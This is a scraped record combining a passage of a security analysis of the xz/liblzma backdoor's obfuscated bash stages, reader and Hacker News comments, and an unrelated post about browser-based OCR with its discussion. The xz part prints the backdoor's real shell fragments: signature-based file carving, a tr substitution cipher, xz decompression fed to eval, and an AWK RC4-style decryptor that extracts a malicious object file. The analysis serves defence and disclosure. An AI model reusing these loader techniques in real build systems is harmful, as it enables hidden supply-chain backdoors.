(head -c +1024 >/dev/null) The -c +1024 option there tells head to read and output only the next 1024 bytes from the incoming data stream (note that the + there is ignored, it doesn't do anything, unlike in tail). However, since the output is redirected in this case to /dev/null, what we effectively get is \"skip the next 1024 bytes\". This is a good moment to note, that if we look at the first 1024 bytes in the uncompressed data stream from the good-large_compressed.lzma file, it's basically the \"A\" character (byte 0x41) repeated 1024 times. To add a bit of foreshadowing, after the first 1024 characters there is some binary data. The next head call looks almost identical, with a different length: head -c +2048 Note that in this case output is not ignored – it will actually be passed to the next step as input. And this pattern repeats: 1024 bytes are ignored, than 2048 bytes are outputted, 1024 bytes ignored, 2048 outputted... and so on until we get to the very end of the file where only 724 bytes (in 5.6.0) or 939 bytes (in 5.6.1) are outputted. To visualize this, here's the actual input data that's processed by this set of head calls. Byte 0 is on top-left of the file; each column represents 256 bytes of the file as grayscale. Note the \"empty gray\" regions between the high entropy (\"noisy\") areas – what this part of the script does is basically just removing the empty regions and merging the regions with actual data together. → In the next step – tail -c +31233 – the initial portion of the data is discarded (spoiler: it hides the binary backdoor, which is extracted in the next Stage, so it's not needed now). In 5.6.0 that would be the first 31264 bytes and in the 5.6.1 that's 31232 (the one-off difference is because of tail -c +N means \"start outputting from byte N\" and not \"ignore first N bytes\"). Step 5 revisits the tr command, which in this case is used as a very simple substitution cipher, with key (byte value mapping) being different in 5.6.0 and 5.6.1: 5.6.0: tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" 5.6.1: tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\" As per previous explanation, this basically means that (for 5.6.0) byte of value 5 will be substitute with byte of value 0, byte of value 6 will be substituted with byte of value 1, and so on. In each case there are 6 ranges which map to the whole 0 - 255 (that's 377 octal) range. In the last step the deciphered data is decompressed (xz -F raw --lzma1 -dc) and the resulting Stage 2 is promptly executed. Stage 2 Stage 2 is the infected.txt file attached by Andres in the original email (that's the 5.6.0 version btw). There's a lot going on in this bash script, as this is where the actual compilation process modification happens. From the perspective of obfuscation analysis, there are three interesting fragments to this script, two of which appear only in the 5.6.1 version. Let's start with them, as they are also simpler. Stage 2 \"extension\" mechanism Fragment 1: vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null` if test \"x$vs\" != \"x\" > /dev/null 2>&1;then f1=`echo $vscut -d: -f1` if test \"x$f1\" != \"x\" > /dev/null 2>&1;then start=`expr $(echo $vscut -d: -f2) + 7` ve=`grep -broaF '|_!{ $srcdir/tests/files/ 2>/dev/null` if test \"x$ve\" != \"x\" > /dev/null 2>&1;then f2=`echo $vecut -d: -f1` if test \"x$f2\" != \"x\" > /dev/null 2>&1;then [ ! \"x$f2\" = \"x$f1\" ] && exit 0 [ ! -f $f1 ] && exit 0 end=`expr $(echo $vecut -d: -f2) - $start` eval `cat $f1tail -c +${start}head -c +${end}tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\"xz -F raw --lzma2 -dc` fi fi fi fi Fragment 3: vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null` if test \"x$vs\" != \"x\" > /dev/null 2>&1;then f1=`echo $vscut -d: -f1` if test \"x$f1\" != \"x\" > /dev/null 2>&1;then start=`expr $(echo $vscut -d: -f2) + 7` ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null` if test \"x$ve\" != \"x\" > /dev/null 2>&1;then f2=`echo $vecut -d: -f1` if test \"x$f2\" != \"x\" > /dev/null 2>&1;then [ ! \"x$f2\" = \"x$f1\" ] && exit 0 [ ! -f $f1 ] && exit 0 end=`expr $(echo $vecut -d: -f2) - $start` eval `cat $f1tail -c +${start}head -c +${end}tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\"xz -F raw --lzma2 -dc` fi fi fi fi These two fragments are pretty much identical, so let's handle both of them at the same time. Here's what they do: First of all they try to find (grep -broaF) two files in tests/files/ directory which contain the following bytes (signature): Fragment 1: \"~!:_ W\" and \"|_!{ -\" Fragment 3: \"jV!.^%\" and \"%.R.1Z\" Note that what's actually outputted by grep in this case has the following format: file_name:offset:signature. For example: $ grep -broaF \"XYZ\" testfile:9:XYZ If such file is found, the offset for each file is extracted (cut -d: -f2, which takes the 2nd field assuming : is the field delimiter), and the first offset + 7 is saved as $start, and the second offset from the second file is saved as $end. Once the script has the $start and $end offsets, it carves out that part of the file-that-had-the-first-signature: cat $f1tail -c +${start}head -c +${end} And what follows is first the substitution cipher (using the 5.6.0 version key from Stage 1 btw): tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\" and then decompressing the data for it to be promptly executed: eval `...xz -F raw --lzma2 -dc` Note that in neither of the investigated TAR archives (5.6.0 and 5.6.1) there were any files with any of the signatures. This whole thing basically looks like an \"extension/patching\" system that would allow adding future scripts to be run in the context of Stage 2, without having to modify the original payload-carrying test files. Which makes sense, as modyfing a \"bad\" and \"good\" test files over and over again is pretty suspicious. So the plan seemed to be to just add new test files instead, which would have been picked up, deciphered, and executed. Stage 2 backdoor extraction As pointed out by Andres in the original e-mail, at some point an .o file is extracted and weaved into the compilation/linking process. The following code is responsible for that (again, differences between versions are marked with black background): N=0 W=88664 else N=88664 W=0 fi xz -dc $top_srcdir/tests/files/$peval $iLC_ALL=C sed \"s/\\(.\\)/\\1/g\"LC_ALL=C awk 'BEGIN{FS=\"\";RS=\"\";ORS=\"\";m=256;for(i=0;i /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true The differences between versions boil down to the size of the compressed-but-somewhat-mangled payload – that's 88792 in 5.6.0 and 88664 in 5.6.1 – and one value change in the AWK script, to which we'll get in a second. As in all previous cases, the extraction process is a chain of commands, where the output of one command is the input of the next one. Furthermore, actually some steps are identical as in Stage 1 (which makes sense, since – as I've mentioned – they binary payload resides in the previously ignored part of the \"good\" file data). Let's take a look: The first step is identical as step 2 in Stage 1 – the tests/files/good-large_compressed.lzma file is being extracted with xz. Second step is in turn identical as step 3 in Stage 1 – that was the \"a lot of heads\" \"function\" invocation. And here is where things diverge. First of all, the previous output get's mangled with the sed command: LC_ALL=C sed \"s/\\(.\\)/\\1/g\" What this does, is actually putting a newline character after each byte (with the exception of the new line character itself). So what we end up with on the output, is a byte-per-line situation (yes, there is a lot of mixing \"text\" and \"binary\" approaches to files in here). This is actually needed by the next step. The next step is an AWK script (that's a simple scripting language for text processing) which does – as mak pointed out for me – RC4...ish decription of the input stream. Here's a prettyfied version of that script: BEGIN { # Initialization part. FS = \"\"; # Some AWK settings. RS = \"\"; ORS = \"\"; m = 256; for(i=0;i /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o Summary Someone put a lot of effort for this to be pretty innocent looking and decently hidden. From binary test files used to store payload, to file carving, substitution ciphers, and an RC4 variant implemented in AWK all done with just standard command line tools. And all this in 3 stages of execution, and with an \"extension\" system to future-proof things and not have to change the binary test files again. I can't help but wonder (as I'm sure is the rest of our security community) – if this was found by accident, how many things still remain undiscovered. Comments: 2024-03-30 20:18:29 = xeb { Can't wait for writeup of the analysis of the binary part... :) } 2024-03-30 20:31:25 = Fox { I appreciate such a clean write-up, your style doesn't beat around the bush and is probably the best analysis that gets right to the point that I find most interesting. I will bookmark this site! } 2024-03-30 20:34:54 = Rhialto { Here are some notes I made, It's not written up as nicely as yours but there are some details that you could fill in in your version. https://pastebin.com/5gnnL2yT } 2024-03-30 20:42:58 = youdabest { gynvael- would love to watch an english live stream reveresing session on the payload. miss your youtube content tremendously! } 2024-03-30 20:54:53 = Wolf480pl { I was wondering about the test file's interleaved low-entropy and high-entropy areas. Do you think it was in order to make it look more believable as a test file, eg. to seem like it was checking if xz will correctly detect which parts are compressible and which should be left uncompressed? } 2024-03-30 20:56:06 = sed { Very nice analysis. One small addition. In build-to-host.m4, the following line returns the filename bad-3-corrupt_lzma2.xz (with directories in front depending on where it's run, I didn't check that) gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null this is, to me, the actual start of the attack. The file bad-3-corrupt_lzma2.xz contains the strings ####Hello#### and ####World#### (second one being followed by a newline) which are (the second one only because of $, to match \"end of line\"). } 2024-03-30 21:02:39 = TrojanWoodCombustible { Really nice and high quality analysis, and that's only the bash part. It will be very interesting to see what the binary does. } 2024-03-30 21:13:42 = pnt { Could someone please explain how this concerns sshd in such a way that it can allow a login without prior knowledge of password and password? } 2024-03-30 22:27:19 = Me { Thank you so much gynvael. for pnt: I believe the corrupted liblzma_la-crc64-fast.o may be used by sshd and. I think this allows remote code execution when used with a specific key/payload https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b } 2024-03-31 00:12:19 = OMO { It's really nice analysis! Many thanks!! I'm very concerned that this malicious code will effect not only for ssh but also others. } 2024-03-31 00:24:40 = alexshpilkin { Re XORing or not, this is indeed most likely an AWK thing: AWK lacks XOR, it lacks any bitwise operations in fact. It only understands double-precision floating point as far as numbers go, and evidently its authors either did not think of or did not bother to implement the hack JavaScript (and Lua BitOp) later invented for this situation. Also, once you have the output of a stream cipher, it doesn’t really matter as far as security is concerned if you mix it in using addition mod 2 on the bit stream (i.e. XOR) or addition mod 256 on the byte stream. Aside from compatibility with most premade RC4 encryption routines out there, nothing is lost by the latter option. So if the author of this snippet did not want to spend the bytes on making a table-driven XOR implementation, this seems like a simple and clever solution. } 2024-03-31 01:15:39 = EmmanuelDgz { I thought \"simple\" attacks were possible only in the 90's. What a shame using amazing skills for bad. } 2024-03-31 01:50:11 = ceretullis { Probably a dumb observation... but, could the binary data in the line 2 comment be an IP addresses? E.g. IPv6 addresses from v1 86f9::5af7:2e68:6abc 86f9:5af7::2e68:6abc 86f9:5af7:2e68::6abc from v2 E555::89B7:2404:D817 E555:89B7::2404:D817 E555:89B7:2404::D817 Or pairs of IPv4 addresses? 134.249.90.247 and 46.104.106.188 (v1) 229.255.137.183 and 36.4.216.23 (v2) } 2024-03-31 01:56:48 = somebody { It is terrifying knowing that this was discovered by accident and it makes me wonder what else might be hiding in our systems. Few things are still unclear to me: 1. \"Jia Tan\" has 700 commits. How many of these were genuine and when did he start committing malicious code? 2. Who is Lesse Collins? Is he also an alias of the attacker or is he a real person? He mentioned on the mailing list that he was talking to \"Jia Tan\" and it is surprising to me that he hasn't come forward and told us what were these discussions about, and how Jia Tan approached him at first. 3. What is the likelihood that there may be other yet-to-be-discovered backdoors for the same malicious code he added in xz? 4. Someone with this level of sophistication is perfectly capable of discovering exploitable vulnerabilities on his own, so what was even the point of going the supply chain route? Unless his target is _everyone_, but I still don't understand his motivation. It can't be financial, because his skills can net him a huge amount of money legally. } 2024-03-31 04:42:19 = Stan { 2. Lasse Collins is the maintainer of xz, and apparently a real person. He posted some info on the xz project server: https://tukaani.org/xz-backdoor/ Expect more info in early April 3. There some likelihood there are other backdoors. The distributions are reverting to a version before Jia Tang started work on xz. Lasse Collins already reverted a change that disabled some sandboxing. 4. A nation state may want to target _everyone_. A Remote Command Execution vulnerability in sshd would be extremely valuable. } 2024-03-31 06:58:01 = tfr { Lasse Collin is the original author of xz. Jia Tan started submitting PR-s and then slowly worked his way up to gaining Lasse's trust and becoming a package contributor at first and then release manager. Jia's and Lasse's interaction and the backstory is documented pretty well here: https://boehs.org/node/everything-i-know-about-the-xz-backdoor } 2024-03-31 07:22:06 = Mention { @somebody Lasse Collins is a real person, a lone OSS developer and a victim in this case. He blogged about this: https://tukaani.org/xz-backdoor/ } 2024-03-31 08:51:17 = Michał { @EmmanuelDgz Look at the opposite direction you will certainly find shame there. One man to rule them all. What just happened is historic. Probably an individual action, a human being with patience, simplicity, normality in a world of AI that walks on its head, nothing could be easier to shake. As for the software, I hope that anew one written from scratch is already underway. You would have to be really stupid to continue using the current software after admitting to not knowing the extent of the damage. } 2024-03-31 09:16:16 = Michał { @somebody How do you know he is a victim, maybe he is, but I don't know and I'm not interested in that because the important thing here is the software and it has been corrupted . The answer is simple and obvious, you have to eliminate this software for a new one that does the same thing. This is why I have no doubt... that the best free and open source developers have already gathered around a table to rewrite one that will do the same thing as the old one and even better. } 2024-03-31 09:21:10 = ralfj { Thanks for the amazing writeup! Just one comment, 377 octal is 255 decimal. (The text says it's 256.) } 2024-03-31 09:22:40 = Gynvael Coldwind { @ralfj Thanks, fixed! } Add a comment: Nick:URL (optional):Math captcha: 10 ∗ 5 ＋ 6 =",
    "commentLink": "https://news.ycombinator.com/item?id=39878681",
    "commentBody": "Xz/liblzma: Bash-stage Obfuscation Explained (gynvael.coldwind.pl)301 points by ecliptik 12 hours agohidepastfavorite32 comments politelemon 12 hours agoThanks the simplified explanation and noisy image comparison is quite appreciated. It gives me a good grasp of what people mean by the sophistication involved. I also saw a comment on reddit mentioning that the \"sandboxing\" method was sabotaged with a dot. It's on the line just after \"#include \" you can see a dot all the way on the left. https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2... https://old.reddit.com/r/linux/comments/1brhlur/xz_utils_bac... reply temp12237792 10 hours agoparentOMG that's evil. The diff just shows: + +. + and the dot goes unnoticed reply emmelaich 7 hours agorootparentI wonder why they didn't use a non-breaking space or similar. I guess it's possible a nbsp would stand out even more. reply jetpks 6 hours agorootparentthe extra dot is easily hand waved away as a mistake. a non breaking space looks intentional. reply cqqxo4zV46cp 8 hours agorootparentprevlike a more (ostensibly) malicious “goto fail” reply mrkramer 25 minutes agoprevThe whole XZ drama reminds me of this[1], in another words, verify the identity of open source maintainer/s and question their motive for joining the open source project. Also reminded me of the relevant XKCD meme[2]. Speaking of obfuscation; I'm not a programmer but I did some research in Windows malware RE and what stuck with me is that every code that is obfuscated or every code that is unused is automatically suspicious. There is no purpose for obfuscated code in the open source non-profit software project and there is no purpose for extra code that is unused. Extra/redundant code is most likely junk code meant to confuse the reverse engineer when s/he is debugging the binary. [1] https://lwn.net/Articles/846272/ [2] https://xkcd.com/2347/ reply Martinussen 8 hours agoprevHow on earth did any of this make it through a code review and get merged in? It seems absurdly careless, unless I am missing something. reply plg94 7 hours agoparentthe bad actor was a co-maintainer of the repo (and even more active than the original maintainer for quite some time) with full commit rights. This was strait committed to master, no PR and no review required. edit: also this was heavily obfuscated in some binary files that were marked as test files (\"good\" and \"bad\" xz compressed test file). No way to spot this if you don't know what you're looking for. reply jghn 2 hours agorootparentNot only were they a co-maintainer, but if you're relying on code review to ensure correctness and security, you've already lost the battle. Code reviews are more about education and de-siloing. reply 1letterunixname 2 hours agorootparentprevThis is the problem of projects that allow direct access and lack code review. reply SV_BubbleTime 5 hours agorootparentprevIn addition… if your build system has things like this as OK: > xz -dc $top_srcdir/tests/files/$peval $iLC_ALL=C sed \"s/\\(.\\)/\\1/g\"LC_ALL=C awk 'BEGIN{FS=\"\";RS=\"\";ORS=\"\";m=256;for(i=0;i<m;i++){t[sprintf(\"x%c\",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[\"x\" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j= You should probably expect the potential for abuse? We’re moving towards complexity that is outpacing human ability for any one person to understand, explain, and thus check an entire object. And for what? Build efficiency? Making a “trick” thing? When was the project ever going to go back and make things simpler? (Never) reply necubi 3 hours agorootparentI’m not sure why you’d say that we’re “moving towards” this sort of build system complexity. This is 1990s autoconf bs that has not yet been excised from the Linux ecosystem. Every modern build system, even the really obtuse ones, are less insane than autoconf. And the original purpose of this was not for efficiency, but to support a huge variety of target OSes/distros/architectures, most of which are no longer used in any real capacity. reply ibotty 1 hour agorootparentThis is not part of autotools output. This is part of the backdoor. Not arguing about autotools drawbacks though. reply mrb 2 hours agorootparentprevTo be clear: the build system did not use the code fragment you quoted. This complex awk code is a later stage of the backdoor. reply asveikau 8 hours agoparentprevThe commit messages for the test files claim they used an RNG to generate them. The guy making the release tarball then put the final line in the right place without checking it in. reply sega_sai 12 hours agoprevDid anyone search github yet for similar headtail tricks ? I doubt it was invented just for this. reply saagarjha 5 hours agoparentIt’s clever but not entirely novel, this is kind of the intended usecase for these reply rmast 3 hours agorootparentThe use of head/tail for deobfuscation also isn’t visible as plain text in the repository or release tarball, which makes searching for its use in other repositories more difficult (unless a less obfuscated version was tested elsewhere). reply nabakin 10 hours agoparentprevOpportunity to write a paper reply rmast 7 hours agorootparentMaybe some analysis of odd patterns in entropy of binary files committed to repositories could pick out some to look at a bit deeper? reply marco_patino 4 hours agoprevNow the GitHub repo has been disabled by GitHub due to violation of GitHub's terms. https://github.com/tukaani-project/xz reply senoralligator 9 hours agoprevhttps://github.com/tukaani-project/.github/issues/2 reply mappu 4 hours agoparentThat's quite funny - yes, not only is this a horrible wilful backdoor, it is also a GPL violation since the backdoor is a derived work without included source / distributed not in \"the preferred form for modification\". reply 1letterunixname 2 hours agoprevNever allow complexity in code or so-called engineers who ask to merge tons of shitty code. Get rid of that shit and don't trust committers blindly. Anyone who enables this crap is also a liability. reply jijijijij 10 hours agoprev [–] How are the binary files passed to those stage-0 commands? reply viraptor 9 hours agoparent [–] They already exist in the source. They're split in the compression test files themselves. (Unless you meant some other binaries?) reply jijijijij 8 hours agorootparent [–] Yeah, but how exactly are they passed to those commands? I don't see/understand that part. I don't see the \"take this file here\" part. reply chaosite 8 hours agorootparent [–] That's for 2 reasons: 1. It might not be there in the place where you're looking. It exists in the m4 in the release tarballs, not in the git repo. 2. It's highly obfuscated. reply jijijijij 7 hours agorootparentNo, as far as I understand the binary files must be pointed at here: '$gl_am_configmake' ... But I don't see how. This: 'gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/`' seem to match the '####Hello####', but, as far as I can see, that's supposed to be the already converted script?! I presumed the binary files not to contain human readable strings, maybe that's the whole confusion. reply credulousperson 6 hours agorootparentOpening bad-3-corrupt_lzma2.xz in an editor reveals it indeed has the string ####Hello####. I don't know enough about lzma compression streams to explain how this appears in the \"compressed\" version of the payload, but it does. reply loeg 6 hours agorootparentI think part of it being a bad/corrupt test case means it doesn't have to be valid xz encoding. But I don't know if that even matters. reply fomine3 6 hours agorootparentprev [–] m4 is somewhat obfuscated by default, that's a part of the problem IMO reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The blog post addresses a backdoor discovered in xz/liblzma that impacted OpenSSH servers, with a focus on obfuscated binaries and obfuscation techniques in bash stages.",
      "It discusses the differences between versions 5.6.0 and 5.6.1, the extraction of concealed backdoor code, and the potential threats associated with the breach.",
      "The post covers the analysis of the malicious code, the possible motivations of the attackers, and the actions taken by xz maintainer Lasse Collins to resolve the issue, emphasizing the importance of enhancing system security and rewriting the software to prevent future vulnerabilities."
    ],
    "commentSummary": [
      "A backdoor was discovered in the XZ/liblzma project, implemented through bash-stage obfuscation by inserting a dot in the code to subvert sandboxing methods.",
      "The backdoor was camouflaged in binary files labeled as test files, making detection challenging, highlighting concerns about code review practices and open-source project security.",
      "The GitHub repository was shut down because of violations, including breaching GitHub's terms and a GPL violation, emphasizing the importance of strict compliance with licensing agreements."
    ],
    "points": 301,
    "commentCount": 32,
    "retryCount": 0,
    "time": 1711832896
  },
  {
    "id": 39877391,
    "title": "Web-based OCR Tool Processes PDFs and Images Instantly",
    "originLink": "https://simonwillison.net/2024/Mar/30/ocr-pdfs-images/",
    "originBody": "Simon Willison’s Weblog Subscribe Running OCR against PDFs and images directly in your browser 30th March 2024 I attended the Story Discovery At Scale data journalism conference at Stanford this week. One of the perennial hot topics at any journalism conference concerns data extraction: how can we best get data out of PDFs and images? I’ve been having some very promising results with Gemini Pro 1.5, Claude 3 and GPT-4 Vision recently—I’ll write more about that soon. But those tools are still inconvenient for most people to use. Meanwhile, older tools like Tesseract OCR are still extremely useful—if only they were easier to use as well. Then I remembered that Tesseract runs happily in a browser these days thanks to the excellent Tesseract.js project. And PDFs can be processed using JavaScript too thanks to Mozilla’s extremely mature and well-tested PDF.js library. So I built a new tool! tools.simonwillison.net/ocr provides a single page web app that can run Tesseract OCR against images or PDFs that are opened in (or dragged and dropped onto) the app. Crucially, everything runs in the browser. There is no server component here, and nothing is uploaded. Your images and documents never leave your computer or phone. Here’s an animated demo: It’s not perfect: multi-column PDFs (thanks, academia) will be treated as a single column, illustrations or photos may result in garbled ASCII-art and there are plenty of other edge cases that will trip it up. But... having Tesseract OCR available against PDFs in a web browser (including in Mobile Safari) is still a really useful thing. How I built this # For more recent examples of projects I’ve built with the assistance of LLMs, see Building and testing C extensions for SQLite with ChatGPT Code Interpreter and Claude and ChatGPT for ad-hoc sidequests. I built the first version of this tool in just a few minutes, using Claude 3 Opus. I already had my own JavaScript code lying around for the two most important tasks: running Tesseract.js against an images and using PDF.js to turn a PDF into a series of images. The OCR code came from the system I built and explained in How I make annotated presentations (built with the help of multiple ChatGPT sessions). The PDF to images code was from an unfinished experiment which I wrote with the aid of Claude 3 Opus a week ago. I composed the following prompt for Claude 3, where I pasted in both of my code examples and then added some instructions about what I wanted it to build at the end: This code shows how to open a PDF and turn it into an image per page:PDF to Images .image-container img { margin-bottom: 10px; } .image-container p { margin: 0; font-size: 14px; color: #888; }const desiredWidth = 800; const fileInput = document.getElementById('fileInput'); const imageContainer = document.querySelector('.image-container'); fileInput.addEventListener('change', handleFileUpload); pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.9.359/pdf.worker.min.js'; async function handleFileUpload(event) { const file = event.target.files[0]; const imageIterator = convertPDFToImages(file); for await (const { imageURL, size } of imageIterator) { const imgElement = document.createElement('img'); imgElement.src = imageURL; imageContainer.appendChild(imgElement); const sizeElement = document.createElement('p'); sizeElement.textContent = `Size: ${formatSize(size)}`; imageContainer.appendChild(sizeElement); } } async function* convertPDFToImages(file) { try { const pdf = await pdfjsLib.getDocument(URL.createObjectURL(file)).promise; const numPages = pdf.numPages; for (let i = 1; i This code shows how to OCR an image: async function ocrMissingAltText() { // Load Tesseract var s = document.createElement(\"script\"); s.src = \"https://unpkg.com/tesseract.js@v2.1.0/dist/tesseract.min.js\"; document.head.appendChild(s); s.onload = async () => { const images = document.getElementsByTagName(\"img\"); const worker = Tesseract.createWorker(); await worker.load(); await worker.loadLanguage(\"eng\"); await worker.initialize(\"eng\"); ocrButton.innerText = \"Running OCR...\"; // Iterate through all the images in the output div for (const img of images) { const altTextarea = img.parentNode.querySelector(\".textarea-alt\"); // Check if the alt textarea is empty if (altTextarea.value === \"\") { const imageUrl = img.src; var { data: { text }, } = await worker.recognize(imageUrl); altTextarea.value = text; // Set the OCR result to the alt textarea progressBar.value += 1; } } await worker.terminate(); ocrButton.innerText = \"OCR complete\"; }; } Use these examples to put together a single HTML page with embedded HTML and CSS and JavaScript that provides a big square which users can drag and drop a PDF file onto and when they do that the PDF has every page converted to a JPEG and shown below on the page, then OCR is run with tesseract and the results are shown in textarea blocks below each image. I saved this prompt to a prompt.txt file and ran it using my llm-claude-3 plugin for LLM: llm -m claude-3-opus < prompt.txt It gave me a working initial version on the first attempt! Here’s the full transcript, including my follow-up prompts and their responses. Iterating on software in this way is so much fun. First follow-up: Modify this to also have a file input that can be used—dropping a file onto the drop area fills that input make the drop zone 100% wide but have a 2em padding on the body. it should be 10em high. it should turn pink when an image is dragged over it. Each textarea should be 100% wide and 10em high At the very bottom of the page add a h2 that says Full document—then a 30em high textarea with all of the page text in it separated by two newlines Here’s the interactive result. And then: get rid of the code that shows image sizes. Set the placeholder on each textarea to be Processing... and clear that placeholder when the job is done. Which gave me this. I noticed that it didn’t demo well on a phone, because you can’t drag and drop files in a mobile browser. So I fired up ChatGPT (for no reason other than curiosity to see how well it did) and got GPT-4 to add a file input feature for me. I pasted in the code so far and added: Modify this so jpg and png and gif images can be dropped or opened too—they skip the PDF step and get appended to the page and OCRd directly. Also move the full document heading and textarea above the page preview and hide it u til there is data to be shown in it Then I spotted that the Tesseract worker was being created multiple times in a loop, which is inefficient—so I prompted: Create the worker once and use it for all OCR tasks and terminate it at the end I’d tweaked the HTML and CSS a little before feeding it to GPT-4, so now the site had a title and rendered in Helvetica. Here’s the version GPT-4 produced for me. Rather delightfully it used the neater pattern where the file input itself is hidden but can be triggered by clicking on the large drop zone, and it updated the copy on the drop zone to reflect that—without me suggesting those requirements. Manual finishing touches # Fun though it was iterating on this project entirely through prompting, I decided it would be more productive to make the finishing touches myself. You can see those in the commit history. They’re not particularly interesting: I added Plausible analytics (which I like because they use no cookies) I moved the “full document” textarea to the top of the page, for convenience in copying out the full document when working with a PDF I bumped up the width of the rendered PDF page images from 800 to 1000. This seemed to improve OCR quality—in particular, the Claude 3 model card PDF now has less OCR errors than it did before. I upgraded both Tesseract.js and PDF.js to the most recent versions. Unsurprisingly, Claude 3 Opus had used older versions of both libraries. I’m really pleased with this project. I consider it finished—it does the job I designed it to do and I don’t see any need to keep on iterating on it. And because it’s all static JavaScript and WebAssembly I expect it to continue working effectively forever. Posted 30th March 2024 at 5:59 pm · Follow me on Mastodon or Twitter or subscribe to my newsletter More recent articles llm cmd undo last git commit - a new plugin for LLM - 26th March 2024 Building and testing C extensions for SQLite with ChatGPT Code Interpreter - 23rd March 2024 Claude and ChatGPT for ad-hoc sidequests - 22nd March 2024 Weeknotes: the aftermath of NICAR - 16th March 2024 The GPT-4 barrier has finally been broken - 8th March 2024 Prompt injection and jailbreaking are not the same thing - 5th March 2024 Interesting ideas in Observable Framework - 3rd March 2024 Weeknotes: Getting ready for NICAR - 27th February 2024 The killer app of Gemini Pro 1.5 is video - 21st February 2024 This is Running OCR against PDFs and images directly in your browser by Simon Willison, posted on 30th March 2024. datajournalism 38 ocr 14 projects 359 tesseract 2 aiassistedprogramming 14 Previous: llm cmd undo last git commit - a new plugin for LLM Source code © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024",
    "commentLink": "https://news.ycombinator.com/item?id=39877391",
    "commentBody": "Running OCR against PDFs and images directly in the browser (simonwillison.net)240 points by simonw 15 hours agohidepastfavorite41 comments aabhay 13 hours agoI was really impressed until I realized that the app is basically a wrapper around tesseract.js, which is the actually cool part. Tesseract has a wasm port that can operate inside of a webworker. Not saying that the article was being misleading about this, just saying that the LLM part is basically doing some standard interfacing and HTML/CSS/JS around that core engine, which wasn’t immediately obvious to me when scanning the screenshots. reply simonw 13 hours agoparentThe LLM part is almost irrelevant to the final result to be honest: I used LLMs to help me build an initial prototype in five minutes that would otherwise have taken me about an hour, but the code really isn't very complex. The point here is more about highlighting that browsers can do this stuff, and it doesn't take much to wire it all together into a useful interface. reply authorfly 3 hours agoparentprevSimon - hope you don't mind me commenting on you in third person in relation to the above. Simon is a great explainer, but I wish he would credit the underlying technology or library (like tesseract.js) a bit more upfront, like you. It matters in this case because for tesseract, the exact model is incredibly important. For example, v4 is pretty bad (but what is available on most linux distros when ran serverside) whereas v5 is decent. So I would have had a more accurate interest in this post if it was a bit more upfront that \"Tesseract.js lets you run OCR against PDFs fairly quickly now, largely because of better processors we as devs have, not because of any real software change in the last 2-3 years\". I felt this before for his NLP content too - but clearly it works because he's such a great explainer and one for teasing content later that you do read it! I must say I've never been left confused by Simons work. reply spullara 6 hours agoparentprevUsing the built-in browser OCR is usually much better but it is still behind an experimental API. reply giovannibonetti 9 hours agoprevIn the same vein, I'm building a tool [1] to extract tables from PDFs (no OCR yet) and spreadsheets. The end goal is to make it easy to combine data from multiple sources by joining tables and produce some useful reports out of it. The PDF parsing is done by the excellent PDFplumber Python library [2], the web app is built with Elixir's Phoenix framework and it is all hosted on Fly.io. [1] https://data-tools.fly.dev [2] https://github.com/jsvine/pdfplumber reply serjester 9 hours agoparentI recently built a similar tool except it’s configured to use some deep learning libraries for the table extraction. I’m excited to integrate unitable which has state of the art performance later this week. I built this because most of the basic layout detection libraries have terrible performance on anything non trivial. Deep learning is really the long term solution here. https://github.com/Filimoa/open-parse reply pants2 4 hours agorootparentThis is extremely cool and exactly what I've been looking for. Looking forward to trying it out. reply codazoda 13 hours agoprevThis is timely. I just completed a few experiments and wrote a little about doing OCR on my handwritten notes. https://notes.joeldare.com/handwritten-text-recognition Tesseract was one of the tools I tested, although I used the CLI instead of the WASM version. reply f_k 9 hours agoparentShameless plug: You can also try https://getsearchablepdf.com for batch OCR, it supports images and handwriting. reply Oras 11 hours agoprevThis is nice but Tesseract does not perform well when it comes to tables, at least when I tried it on multiple documents. It would miss some cells from a table, or does not recognise all the numbers when they have commas. reply simonw 11 hours agoparentTables are still the big unsolved problem for me. There are a ton of potential tools out there like Tabula and AWS Textract table mode but none of them have felt like the perfect solution. I've been trying Gemini Pro 1.5 and Claude 3 Opus and they looked like they worked... but in both cases I spotted them getting confused and copying in numbers form the wrong rows. I think the best I've tried is the camera import mode in iOS Excel! Just wish there was an API for calling that one programmatically. reply CharlesW 10 hours agorootparentOut of curiosity have you tried ocrs by Robert Knight? https://github.com/robertknight/ocrs reply simonw 10 hours agorootparentNo I hadn't heard of that one! reply maCDzP 3 hours agorootparentprevI think the camera import on Excel MacOS works pretty well. You could probably call that version through an API. reply sumedh 10 hours agorootparentprevGoogle and Azure have their own PDF Table extraction service but I have noticed Textract is a bit better. reply ein0p 3 hours agoprevTesseract is way outdated though, to the point of being borderline useless when compared to alternatives. What’s the current deep learning based FOSS SOTA, does anyone know? I want something that does what FineReader does - create a high quality searchable text underlay for scanned PDFs. reply ignoramous 12 hours agoprevWow, this is promising. I tried on a few poorly scanned papers I've lying about. A few observations: 